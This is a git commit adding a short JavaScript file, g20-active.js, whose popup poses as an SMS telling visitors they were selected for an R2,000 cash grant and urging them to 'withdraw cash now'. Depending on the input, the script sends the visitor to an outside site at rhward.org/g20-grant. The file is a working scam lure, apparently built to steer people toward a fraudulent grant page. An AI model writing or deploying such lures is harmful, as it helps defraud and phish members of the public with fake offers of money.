b1e451a0ed4d3b63448a09cd241959c71b024565
itidnewblog1 <newblog1itid@gmail.com>
2025-09-29 16:05:31 +0100

    Create g20-active.js

---
+++ g20-active.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW R2,000'
+password=prompt('SMS: Congratulations, you are among the selected ones to receive R2,000 cash grant, Press Ok to withdraw cash Now ','WITHDRAW R2,000');
+if (password != 'WITHDRAW R2,000') {
+location.href='https://rhward.org/g20-grant';
+}
